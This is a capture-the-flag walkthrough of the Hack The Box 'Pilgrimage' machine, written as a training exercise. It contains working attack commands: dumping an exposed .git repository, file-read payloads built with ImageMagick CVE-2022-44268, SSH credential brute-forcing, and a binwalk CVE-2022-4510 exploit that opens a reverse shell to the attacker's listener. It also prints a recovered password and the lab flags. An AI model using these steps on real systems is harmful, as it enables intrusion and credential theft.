
HTB Pilgrimage Machine - https://www.hackthebox.com/machines/pilgrimage

### 22/09/2023

### Scanning & Enumeration
Scan the machine with Nmap tool
```
nmap -A -p- -Pn -T4 10.10.11.219
```

![](/assets/img/posts/Pasted%20image%2020260819223039.png)

We will find that port 80 is redirect to `pilgrimage.htb` , so let us make a map host and add it to the `/etc/hosts` , to be able to navigate to the website.
	`10.10.11.219 pilgrimage.htb`

Let's take a look at the website

![[Pasted image 20250816233216.png]]

We will do files brut forcing
```
dirsearch -u https://pilgrimage.htb
```
Results: `.git`

Which have 200 status code response, and it means we can access the file.

We will dump the git repository with: <https://github.com/arthaud/git-dumper>
```
git-dumper http://pilgrimage.htb/.git/ git
```
After we dumped the data in `.git` file out, we found that we got all the website source code, which including files, folders, PHP files, and the magick program.

After we analyzed all the files that we dumped, we found out that Magick Convert is used on the website.

![[Pasted image 20250816233252.png]]

In the folder that we Dumped, there is a program called magick, when check the its version, it was: version 7.1.0--49.
![[Pasted image 20250816233302.png]]

After searching in google for vulnerabilities. We found an Arbitary File Read vulnerability (CVE 2022–44268). 
![[Pasted image 20250816233312.png]]

### Exploitation & Gaining Access
The vulnerability reads a file located on the website server. The version that can use this vulnerability is 7.1.0--46 or less.

So lets clone it to our kali
```
git clone https://github.com/voidz0r/CVE-2022-44268.git
```

This command we will use it to add a payload to the image
```
cargo run '/etc/passwd\'
```
This command will increase the payload by reading the file `/etc/passwd` on the server of the website.

![](/assets/img/posts/Pasted%20image%2020260819224454.png)

We will use exiftool to check if there is payload added to the actual image or not: <https://github.com/exiftool/exiftool>
```
exiftool image.png
```

![[Pasted image 20250816233349.png]]
Found that `/etc/passwd` was added to the profile of the image where we added the payload.

After we get the image with Payload, go back to the first website page. That we can upload image files. and when we successfully upload the image file. A link to the uploaded image will be displayed.

![](/assets/img/posts/Pasted%20image%2020260819224701.png)

Then let us download the images that we have uploaded. to analyze the file by this command:
```
identify -verbose 6sd1f4dfdf.png
```

![[Pasted image 20250816233412.png]]

After we analyzed the file will find that there is a Hex value in the image as well

we will find a payload in hexadecimal format. To decode it, we can use the `CyberChef` tool, which it allows us to convert it to ASCII text. https://gchq.github.io/CyberChef/
![[Pasted image 20250816233439.png]]

 
Which is the information inside the `/etc/passwd` file of the server machine. That means we can read any file, any address on the server machine through the payload that can be inserted in the image.

But that still can't allow us to get into the server anyway. So we had to come back and analyze the files we dumped from `.git` again, which we will found that in the file `dashboard.php` has sqlite executed using the path `/var/db/pilgrimage` which is quite interesting.

![[Pasted image 20250816233500.png]]

So we will use it to add a payload to the image is as follows.
```
cargo run '/var/db/pilgrimage'
```

![[Pasted image 20250816233516.png]]

Then we will uploaded the new Payload image and downloaded it again for analysis. we will see the new Hex value can't be read easily when we convert it to ASCII text by `CyberChef` tool.
<https://gchq.github.io/CyberChef/> , which is expected to be a SQLite format

![[Pasted image 20250816233538.png]]

So we will put the Hex values ​​in a file. and convert the extension to sqlite which should make it easier to read.
```
mousepad hex_sqllite
xd -r -p hex_sqllite sql.sqlite
```

Then bring the sqlite file that we have converted and read it in the program sqlite3
```
sqlite3 sql.sqlite
sqlite> .dump
```
![[Pasted image 20250816233554.png]]


After we obtain the credentials, we don't yet know which ones are valid.

We can use crackmapexec to brute force the SSH user : <https://github.com/Porchetta-Industries/CrackMapExec>
```
crackmapexec ssh 10.10.11.219 -u user -p pass
```

![[Pasted image 20250816233613.png]]
which we found that `emily` user can login to the system via SSH

After we got the credential, we can logged in via SSH with `emily` user, and found that we could read user.txt
```
ssh emily@10.10.11.219
abigchonkyboi123

emily@pilgrimage:~$ cat user.txt \# accf577a447734f32aac8e7eb773cd49
```

### Privilege Escalation
We will upload `pspy32` script to the server, and run it to see what processes are running on the system: https://github.com/DominicBreuker/pspy
```
scp /home/kali/Desktop/pspy32 emily@10.10.11.219:/tmp
Password: abigchonkyboi123

emily@pilgrimage:~$ ./pspy32
```

![[Pasted image 20250816233653.png]]

It was found that the `malwarescan.sh` script was run repeatedly on the system.

Lets see what inside it
```
emily@pilgrimage:~$ cat /usr/sbin/malwarescan.sh
```

![[Pasted image 20250816233704.png]]

It found that `binwalk` binary was running.

Lets look to the `binwalk` version
```
emily@pilgrimage:~$ binwalk -h
```

![[Pasted image 20250816233723.png]]

After further searching on google, it was found that `binwalk` version 2.3.2 have CVE 2022-4510 escalation vulnerability: https://www.exploit-db.com/exploits/51249
![[Pasted image 20250816233732.png]]

So we will add a reverse shell payload to the image, by putting the image in the folder of the exploit
```
python3 51249.py binwalk_exploit.png 10.10.16.4 4321
```
It will generate the image: binwalk_exploit.png

![](/assets/img/posts/Pasted%20image%2020260819230522.png)

Then we upload the image file to the folder `/var/www/pilgrimage.htb/shrunk` which is the folder where `binwalk` binary reads the file.

First, make a listener from our kali
```
nc -lnvp 4321
```

Second, from another terminal from our kali, make a web server where the binwalk_exploit.png is there
```
python3 -m http.server 5555
```

Third, from the HTM machine, download the image
```
wget 10.10.16.4:5555/binwalk_exploit.png
```

Back to our listener, and we got a shell
```
id
cd /root
cat root.txt          # 05d6b0d8c5872f31344a7b735bc1c637
```
